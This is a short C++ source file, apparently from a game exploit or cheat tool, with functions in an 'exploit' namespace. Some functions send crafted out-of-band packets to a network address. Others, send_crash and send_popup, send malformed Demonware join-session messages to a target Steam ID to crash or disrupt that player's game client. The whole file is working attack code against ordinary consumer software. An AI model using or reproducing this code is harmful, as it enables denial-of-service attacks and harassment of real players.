#include "exploit.hpp"

namespace exploit
{
	void send_connect_response_migration_packet(const netadr_t& to)
	{
		send_oob(to, "connectResponseMigration");
	}
	
	void send_mstart_packet(const netadr_t& to)
	{
		send_oob(to, "mstart");
	}

	void send_request_stats_packet(const netadr_t& to)
	{
		send_oob(to, "requeststats\n");
	} 

	void send_crash(const std::uint64_t target_steam_id)
	{
		if (!Live_IsUserSignedInToDemonware(0))
			return;

		const JoinSessionMessage message{ JOIN_REQUEST };
		dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, sizeof message);
	}

	void send_popup(const std::uint64_t target_steam_id)
	{
		if (!Live_IsUserSignedInToDemonware(0))
			return;

		const JoinSessionMessage message{ JOIN_REPLY };
		dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, 0);
	}
}